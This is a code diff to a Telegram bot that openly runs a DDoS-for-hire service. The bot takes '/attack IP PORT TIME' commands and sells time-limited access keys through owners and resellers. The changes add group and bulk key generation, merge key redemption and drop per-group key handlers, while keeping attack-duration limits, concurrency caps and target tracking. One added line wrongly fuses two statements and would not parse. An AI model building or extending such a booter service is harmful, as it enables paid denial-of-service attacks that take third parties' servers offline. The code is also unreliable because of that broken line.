@@ -82,8 +82,8 @@ db = client["xsilent_bot"]
 
 users_collection = db["users"]
 keys_collection = db["keys"]
-groups_collection = db["groups"]
 group_keys_collection = db["group_keys"]
+groups_collection = db["groups"]
 hosted_bots_collection = db["hosted_bots"]
 settings_collection = db["settings"]
 broadcast_users_collection = db["broadcast_users"]
@@ -96,7 +96,6 @@ cooldown = {}
 hosted_bots = {}
 hosted_bot_instances = {}
 maintenance_mode = False
-group_active_users = {}  # Track group users with active keys
 
 # ========== LOAD/SAVE FUNCTIONS ==========
 def load_users():
@@ -130,7 +129,7 @@ def load_keys():
                 "used": key_data.get("used", False),
                 "used_by": key_data.get("used_by"),
                 "used_at": key_data.get("used_at"),
-                "key_type": key_data.get("key_type", "bot")  # bot or group
+                "key_type": key_data.get("key_type", "bot")
             }
     except Exception as e:
         print(f"Error loading keys: {e}")
@@ -161,7 +160,6 @@ def load_group_keys():
     try:
         for key_data in group_keys_collection.find():
             keys[key_data["key"]] = {
-                "group_id": key_data.get("group_id"),
                 "duration_value": key_data.get("duration_value"),
                 "duration_unit": key_data.get("duration_unit"),
                 "generated_by": key_data.get("generated_by"),
@@ -181,7 +179,6 @@ def save_group_keys(keys_data):
         for key, info in keys_data.items():
             group_keys_collection.insert_one({
                 "key": key,
-                "group_id": info.get("group_id"),
                 "duration_value": info.get("duration_value"),
                 "duration_unit": info.get("duration_unit"),
                 "generated_by": info.get("generated_by"),
@@ -335,6 +332,10 @@ def parse_duration(duration_str):
         hours = duration_str.replace('h', '')
         if hours.isdigit():
             return int(hours), "hour"
+    if duration_str.endswith('d'):
+        days = duration_str.replace('d', '')
+        if days.isdigit():
+            return int(days), "day"
     return None, None
 
 def get_expiry_date(value, unit):
@@ -375,17 +376,17 @@ def check_active_attack_by_target(ip, port):
                 return None
     return None
 
-def check_user_expiry(user_id):
+def check_user_bot_expiry(user_id):
     now = time.time()
     for key, info in keys_data.items():
         if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"] and info.get("key_type") == "bot":
             return True
     return False
 
-def check_group_user_expiry(user_id, group_id):
+def check_user_group_expiry(user_id):
     now = time.time()
     for key, info in group_keys_data.items():
-        if info.get("used_by") == user_id and info.get("group_id") == group_id and info.get("used") == True and now < info["expires_at"]:
+        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
             return True
     return False
 
@@ -484,12 +485,6 @@ def cleanup_expired_keys():
             if info.get("used", False) and now > info["expires_at"]:
                 expired_group_keys.append(key)
         for key in expired_group_keys:
-            user_id = group_keys_data[key].get("used_by")
-            if user_id:
-                # Remove from group active users
-                group_id = group_keys_data[key].get("group_id")
-                if group_id and user_id in group_active_users.get(group_id, set()):
-                    group_active_users[group_id].discard(user_id)
             del group_keys_data[key]
         if expired_group_keys:
             save_group_keys(group_keys_data)
@@ -564,13 +559,13 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             uid = str(msg.chat.id)
             current_time = format_ist_time(get_current_ist())
             if uid == owner_id:
-                content = f"│ 👑 OWNER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /second 10-300\n│ /genkey 1 or 5h\n│ /mykeys\n│ /removekey KEY\n│ /addgroup ID TIME\n│ /removegroup ID\n│ /addreseller ID\n│ /removereseller ID\n│ /broadcast\n│ 📅 {current_time}"
+                content = f"│ 👑 OWNER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /second 10-300\n│ /genkey 1 or 5h\n│ /genkeygroup 1d\n│ /bulk 1h 10\n│ /mykeys\n│ /removekey KEY\n│ /addgroup ID TIME\n│ /removegroup ID\n│ /addreseller ID\n│ /removereseller ID\n│ /broadcast\n│ 📅 {current_time}"
                 hosted_bot.reply_to(msg, hstyled("OWNER HELP", content))
             elif uid in resellers:
-                content = f"│ 💎 RESELLER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /genkey 1 or 5h\n│ /mykeys\n│ 📅 {current_time}"
+                content = f"│ 💎 RESELLER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /genkey 1 or 5h\n│ /genkeygroup 1d\n│ /bulk 1h 10\n│ /mykeys\n│ 📅 {current_time}"
                 hosted_bot.reply_to(msg, hstyled("RESELLER HELP", content))
             elif uid in users:
-                if check_user_expiry(uid):
+                if check_user_bot_expiry(uid):
                     content = f"│ 🔥 USER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /redeem KEY\n│ 📅 {current_time}"
                     hosted_bot.reply_to(msg, hstyled("USER HELP", content))
                 else:
@@ -606,8 +601,8 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             group_id = args[1]
             try:
                 attack_time = int(args[2])
-                if attack_time < 0 or attack_time > 300:
-                    hosted_bot.reply_to(msg, "❌ Attack time must be 0-300 seconds!")
+                if attack_time < 10 or attack_time > 300:
+                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
                     return
             except:
                 hosted_bot.reply_to(msg, "❌ Invalid time!")
@@ -645,12 +640,16 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 hosted_bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
                 return
             key = args[1]
-            if key not in keys_data:
+            if key in keys_data:
+                del keys_data[key]
+                save_keys(keys_data)
+                hosted_bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
+            elif key in group_keys_data:
+                del group_keys_data[key]
+                save_group_keys(group_keys_data)
+                hosted_bot.reply_to(msg, f"✅ GROUP KEY REMOVED!\n🔑 Key: {key}")
+            else:
                 hosted_bot.reply_to(msg, "❌ Key not found!")
-                return
-            del keys_data[key]
-            save_keys(keys_data)
-            hosted_bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
         
         @hosted_bot.message_handler(commands=['addreseller'])
         def hosted_add_reseller(msg):
@@ -699,7 +698,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 return
             args = msg.text.split()
             if len(args) != 2:
-                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
+                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 5h")
                 return
             duration_str = args[1]
             value, unit = parse_duration(duration_str)
@@ -711,23 +710,92 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False, "key_type": "bot"}
             save_keys(keys_data)
             expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
-            hosted_bot.reply_to(msg, f"✅ BOT KEY GENERATED!\n\n🔑 Key: {key}\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}")
+            hosted_bot.reply_to(msg, f"🔑 Key: {key}")
+        
+        @hosted_bot.message_handler(commands=['genkeygroup'])
+        def hosted_genkeygroup(msg):
+            uid = str(msg.chat.id)
+            is_reseller = uid in resellers
+            if uid != owner_id and not is_reseller:
+                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /genkeygroup 1d or /genkeygroup 5h")
+                return
+            duration_str = args[1]
+            value, unit = parse_duration(duration_str)
+            if value is None:
+                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1d or 5h")
+                return
+            key = generate_key()
+            expires_at = get_expiry_date(value, unit)
+            group_keys_data[key] = {"duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
+            save_group_keys(group_keys_data)
+            hosted_bot.reply_to(msg, f"🔑 Key: {key}")
+        
+        @hosted_bot.message_handler(commands=['bulk'])
+        def hosted_bulk(msg):
+            uid = str(msg.chat.id)
+            is_reseller = uid in resellers
+            if uid != owner_id and not is_reseller:
+                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
+                return
+            args = msg.text.split()
+            if len(args) != 3:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /bulk 1h 10 or /bulk 1d 5\n📌 10 = number of keys")
+                return
+            duration_str = args[1]
+            try:
+                count = int(args[2])
+                if count < 1 or count > 100:
+                    hosted_bot.reply_to(msg, "❌ Number of keys must be between 1 and 100!")
+                    return
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid number!")
+                return
+            value, unit = parse_duration(duration_str)
+            if value is None:
+                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1h or 1d")
+                return
+            keys = []
+            for _ in range(count):
+                key = generate_key()
+                expires_at = get_expiry_date(value, unit)
+                keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False, "key_type": "bot"}
+                keys.append(key)
+            save_keys(keys_data)
+            keys_text = "\n".join(keys)
+            hosted_bot.reply_to(msg, f"{keys_text}")
         
         @hosted_bot.message_handler(commands=['mykeys'])
         def hosted_mykeys(msg):
             uid = str(msg.chat.id)
-            if uid != owner_id:
-                hosted_bot.reply_to(msg, "❌ Only bot owner can view keys!")
+            if uid != owner_id and uid not in resellers:
+                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
                 return
-            my_keys = []
+            
+            bot_keys = []
             for key, info in keys_data.items():
                 if info.get("generated_by") == uid and not info.get("used", False) and info.get("key_type") == "bot":
-                    expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
-                    my_keys.append(f"🔑 {key}\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
-            if my_keys:
-                hosted_bot.reply_to(msg, "📋 YOUR GENERATED BOT KEYS:\n\n" + "\n\n".join(my_keys))
-            else:
-                hosted_bot.reply_to(msg, "📋 No bot keys generated yet!")
+                    bot_keys.append(key)
+            
+            group_keys = []
+            for key, info in group_keys_data.items():
+                if info.get("generated_by") == uid and not info.get("used", False):
+                    group_keys.append(key)
+            
+            msg_text = ""
+            if bot_keys:
+                msg_text += "BOT KEYS:\n" + "\n".join(bot_keys)
+            if group_keys:
+                if msg_text:
+                    msg_text += "\n\n"
+                msg_text += "GROUP KEYS:\n" + "\n".join(group_keys)
+            if not msg_text:
+                msg_text = "No keys generated yet!"
+            
+            hosted_bot.reply_to(msg, msg_text)
         
         @hosted_bot.message_handler(commands=['second'])
         def hosted_second(msg):
@@ -744,8 +812,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 if new_max < 10 or new_max > 300:
                     hosted_bot.reply_to(msg, "❌ Value must be 10-300 seconds!")
                     return
-                hosted_bots[bot_token]["max_time"] = new_max
-                save_hosted_bots(hosted_bots)
+                hosted_bots[bot_token]["max_time"] = new_max                save_hosted_bots(hosted_bots)
                 hosted_bot.reply_to(msg, f"✅ Max attack time set to {new_max}s")
             except:
                 hosted_bot.reply_to(msg, "❌ Invalid number!")
@@ -780,34 +847,58 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 hosted_bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
                 return
             key = args[1]
-            if key not in keys_data:
-                hosted_bot.reply_to(msg, "❌ Invalid key!")
-                return
-            key_info = keys_data[key]
-            if key_info.get("used", False):
-                hosted_bot.reply_to(msg, "❌ Key already used!")
-                return
-            if time.time() > key_info["expires_at"]:
-                hosted_bot.reply_to(msg, "❌ Key expired!")
-                del keys_data[key]
+            
+            # Check if it's a bot key
+            if key in keys_data:
+                key_info = keys_data[key]
+                if key_info.get("used", False):
+                    hosted_bot.reply_to(msg, "❌ Key already used!")
+                    return
+                if time.time() > key_info["expires_at"]:
+                    hosted_bot.reply_to(msg, "❌ Key expired!")
+                    del keys_data[key]
+                    save_keys(keys_data)
+                    return
+                if uid not in hosted_bots.get(bot_token, {}).get("users", []):
+                    if bot_token not in hosted_bots:
+                        hosted_bots[bot_token] = {"users": []}
+                    hosted_bots[bot_token]["users"].append(uid)
+                    save_hosted_bots(hosted_bots)
+                if uid not in users:
+                    users.append(uid)
+                    users_data["users"] = users
+                    save_users(users_data)
+                keys_data[key]["used"] = True
+                keys_data[key]["used_at"] = time.time()
+                keys_data[key]["used_by"] = uid
                 save_keys(keys_data)
+                expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
+                content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n│ 📅 Expires: {expiry_str}\n│ ⚡ Concurrent: {concurrent}"
+                hosted_bot.reply_to(msg, hstyled("BOT ACCESS GRANTED", content, "success"))
                 return
-            if uid not in hosted_bots.get(bot_token, {}).get("users", []):
-                if bot_token not in hosted_bots:
-                    hosted_bots[bot_token] = {"users": []}
-                hosted_bots[bot_token]["users"].append(uid)
-                save_hosted_bots(hosted_bots)
-            if uid not in users:
-                users.append(uid)
-                users_data["users"] = users
-                save_users(users_data)
-            keys_data[key]["used"] = True
-            keys_data[key]["used_at"] = time.time()
-            keys_data[key]["used_by"] = uid
-            save_keys(keys_data)
-            expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
-            content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n│ 📅 Expires: {expiry_str}\n│ ⚡ Concurrent: {concurrent}"
-            hosted_bot.reply_to(msg, hstyled("BOT ACCESS GRANTED", content, "success"))
+            
+            # Check if it's a group key
+            elif key in group_keys_data:
+                key_info = group_keys_data[key]
+                if key_info.get("used", False):
+                    hosted_bot.reply_to(msg, "❌ Key already used!")
+                    return
+                if time.time() > key_info["expires_at"]:
+                    hosted_bot.reply_to(msg, "❌ Key expired!")
+                    del group_keys_data[key]
+                    save_group_keys(group_keys_data)
+                    return
+                group_keys_data[key]["used"] = True
+                group_keys_data[key]["used_at"] = time.time()
+                group_keys_data[key]["used_by"] = uid
+                save_group_keys(group_keys_data)
+                expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
+                content = f"│ 🎉 User: {uid}\n│ ⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n│ 📅 Expires: {expiry_str}\n│\n│ You can now attack in ANY GROUP!"
+                hosted_bot.reply_to(msg, hstyled("GROUP ACCESS GRANTED", content, "success"))
+                return
+            
+            else:
+                hosted_bot.reply_to(msg, "❌ Invalid key!")
         
         @hosted_bot.message_handler(commands=['status'])
         def hosted_status(msg):
@@ -843,7 +934,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active bot key.\nUse /redeem KEY to activate your bot access.")
                 return
             
-            if not check_user_expiry(uid):
+            if not check_user_bot_expiry(uid):
                 hosted_bot.reply_to(msg, "❌ BOT ACCESS EXPIRED!\n\nYour bot key has expired.\nUse /redeem KEY to get new bot access.")
                 return
             
@@ -962,105 +1053,12 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         print(f"Failed to start hosted bot: {e}")
         return False
 
-# ========== GROUP KEY COMMANDS ==========
-@bot.message_handler(commands=['groupkey'])
-def groupkey(msg):
-    uid = str(msg.chat.id)
-    
-    if check_maintenance():
-        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
-        return
-    
-    if uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Admin or Reseller only!", "error"))
-        return
-    
-    args = msg.text.split()
-    if len(args) != 4:
-        bot.reply_to(msg, "⚠️ Usage: /groupkey GROUP_ID 1h 10\n📌 Example: /groupkey -100123456789 1h 10\n⏱️ Generate 10 keys of 1 hour for group")
-        return
-    
-    group_id = args[1]
-    duration_str = args[2]
-    try:
-        count = int(args[3])
-        if count < 1 or count > 100:
-            bot.reply_to(msg, "❌ Number of keys must be between 1 and 100!")
-            return
-    except:
-        bot.reply_to(msg, "❌ Invalid number!")
-        return
-    
-    value, unit = parse_duration(duration_str)
-    if value is None:
-        bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
-        return
-    
-    keys = []
-    for _ in range(count):
-        key = generate_key()
-        expires_at = get_expiry_date(value, unit)
-        group_keys_data[key] = {
-            "group_id": group_id,
-            "duration_value": value,
-            "duration_unit": unit,
-            "generated_by": uid,
-            "generated_at": time.time(),
-            "expires_at": expires_at.timestamp(),
-            "used": False,
-            "used_by": None,
-            "used_at": None
-        }
-        keys.append(key)
-    
-    save_group_keys(group_keys_data)
-    
-    expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
-    keys_text = "\n".join([f"🔑 {k}" for k in keys])
-    
-    content = f"│ 👥 Group ID: {group_id}\n│ ⏰ Duration: {format_duration(value, unit)}\n│ 📅 Expires: {expiry_str}\n│ 📊 Count: {count}\n│\n{keys_text}"
-    bot.reply_to(msg, styled_msg("GROUP KEYS GENERATED", content, "success"))
-
-@bot.message_handler(commands=['grouprkey'])
-def grouprkey(msg):
-    uid = str(msg.chat.id)
-    
-    if check_maintenance():
-        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
-        return
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Owner only!", "error"))
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "⚠️ Usage: /grouprkey GROUP_ID")
-        return
-    
-    group_id = args[1]
-    
-    removed = 0
-    keys_to_remove = []
-    for key, info in group_keys_data.items():
-        if info.get("group_id") == group_id and not info.get("used", False):
-            keys_to_remove.append(key)
-    
-    for key in keys_to_remove:
-        del group_keys_data[key]
-        removed += 1
-    
-    save_group_keys(group_keys_data)
-    bot.reply_to(msg, f"✅ REMOVED {removed} UNUSED GROUP KEYS!\n👥 Group ID: {group_id}")
-
 # ========== MAIN BOT COMMANDS ==========
 @bot.message_handler(commands=['start'])
 def start(msg):
     uid = str(msg.chat.id)
     chat_type = msg.chat.type
     current_time = format_ist_time(get_current_ist())
-    
-    heading = "𝐗𝐒𝐈𝐋𝐄𝐍𝐓 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋"
     
     if uid not in broadcast_users:
         broadcast_users.append(uid)
@@ -1080,8 +1078,8 @@ def start(msg):
         group_id = str(msg.chat.id)
         attack_time = groups.get(group_id, {}).get("attack_time", None)
         if attack_time is not None and attack_time > 0:
-            content = f"│ 🔑 GROUP ACCESS REQUIRED\n│\n│ ⚡ Max Attack Time: {attack_time}s\n│ 📅 {current_time}\n│\n│ 📝 To attack in this group:\n│ 1. Get a group key from owner\n│ 2. Use /groupredeem KEY\n│ 3. Then use /attack IP PORT TIME"
-            bot.reply_to(msg, styled_msg(heading, content, "attack"))
+            content = f"│ 🔑 GROUP ACCESS REQUIRED\n│\n│ ⚡ Max Attack Time: {attack_time}s\n│ 📅 {current_time}\n│\n│ 📝 To attack in this group:\n│ 1. Get a group key from owner\n│ 2. Use /redeem KEY\n│ 3. Then use /attack IP PORT TIME"
+            bot.reply_to(msg, styled_msg("DDOS BOT", content, "attack"))
         else:
             bot.reply_to(msg, styled_msg("GROUP NOT CONFIGURED", "│ ❌ Group not configured!\n│ 📞 Contact Owner", "error"))
         return
@@ -1095,7 +1093,7 @@ def start(msg):
 │
 │ 📝 COMMANDS:
 │
-│ ⚔️ ATTACK (BOT):
+│ ⚔️ ATTACK:
 │   /attack IP PORT TIME
 │   /status
 │   /cooldown
@@ -1104,11 +1102,14 @@ def start(msg):
 │
 │ 🔑 BOT KEYS:
 │   /genkey 1 or 5h
-│   /removekey KEY
+│   /bulk 1h 10
 │
-│ 👥 GROUP KEYS:
-│   /groupkey GROUP_ID 1h 10
-│   /grouprkey GROUP_ID
+│ 🔑 GROUP KEYS:
+│   /genkeygroup 1d or 5h
+│
+│ 🔧 OTHER KEYS:
+│   /removekey KEY
+│   /mykeys
 │
 │ 👥 USERS:
 │   /add USER_ID
@@ -1132,7 +1133,7 @@ def start(msg):
 │   /stopattack IP:PORT
 │   /allusers
 │   /api_status"""
-        bot.reply_to(msg, styled_msg(heading, content, "success"))
+        bot.reply_to(msg, styled_msg("OWNER PANEL", content, "success"))
     
     elif uid in resellers:
         content = f"""│ ✅ Reseller Access
@@ -1142,29 +1143,37 @@ def start(msg):
 │
 │ 📝 COMMANDS:
 │
-│ ⚔️ ATTACK (BOT):
+│ ⚔️ ATTACK:
 │   /attack IP PORT TIME
 │   /status
 │   /cooldown
 │
 │ 🔑 BOT KEYS:
 │   /genkey 1 or 5h
-│   /mykeys
+│   /bulk 1h 10
 │
-│ 👥 GROUP KEYS:
-│   /groupkey GROUP_ID 1h 10"""
-        bot.reply_to(msg, styled_msg(heading, content, "success"))
+│ 🔑 GROUP KEYS:
+│   /genkeygroup 1d or 5h
+│
+│ 🔧 OTHER:
+│   /mykeys"""
+        bot.reply_to(msg, styled_msg("RESELLER PANEL", content, "success"))
     
     elif uid in users:
-        has_active = check_user_expiry(uid)
-        status_text = "🟢 ACTIVE" if has_active else "🔴 EXPIRED"
-        if has_active:
-            content = f"""│ ✅ Bot Status: {status_text}
+        has_bot = check_user_bot_expiry(uid)
+        has_group = check_user_group_expiry(uid)
+        bot_status = "🟢 ACTIVE" if has_bot else "🔴 EXPIRED"
+        group_status = "🟢 ACTIVE" if has_group else "🔴 INACTIVE"
+        content = f"""│ 👤 User: {uid}
+│
+│ 🤖 BOT ACCESS: {bot_status}
+│ 👥 GROUP ACCESS: {group_status}
+│
 │ ⚡ Global Concurrent: {MAX_CONCURRENT}
 │ ⏳ Cooldown: {COOLDOWN_TIME}s
 │ 📅 {current_time}
 │
-│ 📝 BOT COMMANDS:
+│ 📝 COMMANDS:
 │
 │ ⚔️ ATTACK:
 │   /attack IP PORT TIME
@@ -1175,92 +1184,16 @@ def start(msg):
 │   /redeem KEY
 │
 │ ℹ️ OTHER:
-│   /help
-│
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group"""
-            bot.reply_to(msg, styled_msg(heading, content, "success"))
-        else:
-            content = f"""│ ⚠️ Bot Status: {status_text}
-│ ⚡ Global Concurrent: {MAX_CONCURRENT}
-│ 📅 {current_time}
-│
-│ 🔑 Your bot access has expired!
-│
-│ Use /redeem KEY to activate new bot access
-│
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group"""
-            bot.reply_to(msg, styled_msg("⚠️ BOT ACCESS EXPIRED", content, "warning"))
+│   /help"""
+        bot.reply_to(msg, styled_msg("USER PANEL", content, "success"))
     
     else:
         content = f"""│ ❌ Unauthorized Access
 │
-│ 🔑 Use /redeem KEY to activate bot access
-│
-│ 🔸 For GROUP attack: Use /groupredeem KEY in group
+│ 🔑 Use /redeem KEY to activate access
 │
 │ 📅 {current_time}"""
-        bot.reply_to(msg, styled_msg(heading, content, "error"))
-
-@bot.message_handler(commands=['groupredeem'])
-def groupredeem(msg):
-    uid = str(msg.chat.id)
-    chat_type = msg.chat.type
-    
-    if chat_type not in ["group", "supergroup"]:
-        bot.reply_to(msg, "❌ This command only works in groups!")
-        return
-    
-    group_id = str(msg.chat.id)
-    
-    # Check if group is configured
-    if group_id not in groups:
-        bot.reply_to(msg, styled_msg("GROUP NOT CONFIGURED", "│ ❌ This group is not configured!\n│ 📞 Contact Owner", "error"))
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "⚠️ Usage: /groupredeem KEY")
-        return
-    
-    key = args[1]
-    
-    if key not in group_keys_data:
-        bot.reply_to(msg, "❌ Invalid group key!")
-        return
-    
-    key_info = group_keys_data[key]
-    
-    if key_info.get("group_id") != group_id:
-        bot.reply_to(msg, "❌ This key is not for this group!")
-        return
-    
-    if key_info.get("used", False):
-        bot.reply_to(msg, "❌ Key already used by someone else!")
-        return
-    
-    if time.time() > key_info["expires_at"]:
-        bot.reply_to(msg, "❌ Key expired!")
-        del group_keys_data[key]
-        save_group_keys(group_keys_data)
-        return
-    
-    # Mark key as used
-    group_keys_data[key]["used"] = True
-    group_keys_data[key]["used_at"] = time.time()
-    group_keys_data[key]["used_by"] = uid
-    save_group_keys(group_keys_data)
-    
-    # Add to group active users
-    if group_id not in group_active_users:
-        group_active_users[group_id] = set()
-    group_active_users[group_id].add(uid)
-    
-    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
-    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
-    max_time = groups[group_id].get("attack_time", 60)
-    
-    content = f"│ 🎉 Group Access Granted!\n│ 👤 User: {uid}\n│ ⏰ Duration: {duration_display}\n│ 📅 Expires: {expiry_str}\n│ ⚡ Max Attack Time: {max_time}s\n│\n│ Now use /attack IP PORT TIME in this group"
-    bot.reply_to(msg, styled_msg("✅ GROUP ACCESS GRANTED", content, "success"))
+        bot.reply_to(msg, styled_msg("UNAUTHORIZED", content, "error"))
 
 @bot.message_handler(commands=['addgroup'])
 def add_group(msg):
@@ -1288,7 +1221,7 @@ def add_group(msg):
     groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
     save_groups(groups)
     
-    bot.reply_to(msg, f"✅ GROUP CONFIGURED!\n👥 Group ID: {group_id}\n⏱️ Max Attack Time: {attack_time}s\n\n📝 Users need group keys to attack here!\nUse /groupkey {group_id} 1h 10 to generate keys")
+    bot.reply_to(msg, f"✅ GROUP CONFIGURED!\n👥 Group ID: {group_id}\n⏱️ Max Attack Time: {attack_time}s\n\n📝 Users need group keys to attack here!\nUse /genkeygroup to generate group keys")
 
 @bot.message_handler(commands=['removegroup'])
 def remove_group_cmd(msg):
@@ -1326,265 +1259,6 @@ def all_groups(msg):
     else:
         bot.reply_to(msg, "📋 No groups configured yet!")
 
-@bot.message_handler(commands=['attack'])
-def attack(msg):
-    uid = str(msg.chat.id)
-    chat_type = msg.chat.type
-    is_group = (chat_type in ["group", "supergroup"])
-    
-    if check_maintenance():
-        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
-        return
-    
-    # GROUP ATTACK
-    if is_group:
-        group_id = str(msg.chat.id)
-        
-        # Check if group is configured
-        if group_id not in groups:
-            bot.reply_to(msg, styled_msg("GROUP NOT CONFIGURED", "│ ❌ This group is not configured!\n│ 📞 Contact Owner", "error"))
-            return
-        
-        max_time_limit = groups[group_id].get("attack_time", 0)
-        
-        # Check if user has group access
-        if group_id not in group_active_users or uid not in group_active_users[group_id]:
-            bot.reply_to(msg, styled_msg("GROUP ACCESS REQUIRED", f"│ 🔑 You don't have access to attack in this group!\n│\n│ Use /groupredeem KEY to get access\n│\n│ ⚡ Max Attack Time: {max_time_limit}s", "warning"))
-            return
-        
-        # Check if user's group key is still valid
-        if not check_group_user_expiry(uid, group_id):
-            group_active_users[group_id].discard(uid)
-            bot.reply_to(msg, styled_msg("GROUP ACCESS EXPIRED", "│ ⚠️ Your group access has expired!\n│ Use /groupredeem KEY to get new access", "warning"))
-            return
-        
-        args = msg.text.split()
-        if len(args) != 4:
-            bot.reply_to(msg, f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time Allowed: {max_time_limit}s")
-            return
-        ip, port, duration = args[1], args[2], args[3]
-        try:
-            duration = int(duration)
-            if duration < 10 or duration > max_time_limit:
-                bot.reply_to(msg, f"❌ Duration must be 10-{max_time_limit} seconds for this group!")
-                return
-        except:
-            bot.reply_to(msg, "❌ Invalid time!")
-            return
-    
-    # BOT ATTACK (Personal)
-    else:
-        if uid not in users:
-            bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ ❌ Use /redeem KEY to activate bot access", "error"))
-            return
-        
-        if not check_user_expiry(uid):
-            bot.reply_to(msg, styled_msg("BOT ACCESS EXPIRED", "│ ⚠️ Your bot access has expired!\n│ Use /redeem KEY to get new bot access", "warning"))
-            return
-        
-        if uid in cooldown:
-            remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
-            if remaining > 0:
-                bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!\n💡 Use /cooldown to check")
-                return
-        
-        args = msg.text.split()
-        if len(args) != 4:
-            bot.reply_to(msg, "❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 120")
-            return
-        ip, port, duration = args[1], args[2], args[3]
-        try:
-            duration = int(duration)
-            if duration < 10 or duration > 300:
-                bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
-                return
-        except:
-            bot.reply_to(msg, "❌ Invalid time!")
-            return
-    
-    # Common validation for both
-    if not validate_ip(ip):
-        bot.reply_to(msg, "❌ Invalid IP address!")
-        return
-    
-    try:
-        port = int(port)
-        if port in BLOCKED_PORTS:
-            blocked_ports_str = ", ".join(map(str, BLOCKED_PORTS))
-            bot.reply_to(msg, f"🚫 Blocked Port: {port}\n❌ Please enter correct port.\n\n📋 Allowed Ports: All except {blocked_ports_str}")
-            return
-        if port < 1 or port > 65535:
-            bot.reply_to(msg, "❌ Port must be between 1 and 65535!")
-            return
-    except:
-        bot.reply_to(msg, "❌ Invalid port!")
-        return
-    
-    total_active = get_total_active_count()
-    if total_active >= MAX_CONCURRENT:
-        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
-        return
-    
-    existing_attack = check_active_attack_by_target(ip, port)
-    if existing_attack:
-        remaining = int(existing_attack["finish_time"] - time.time())
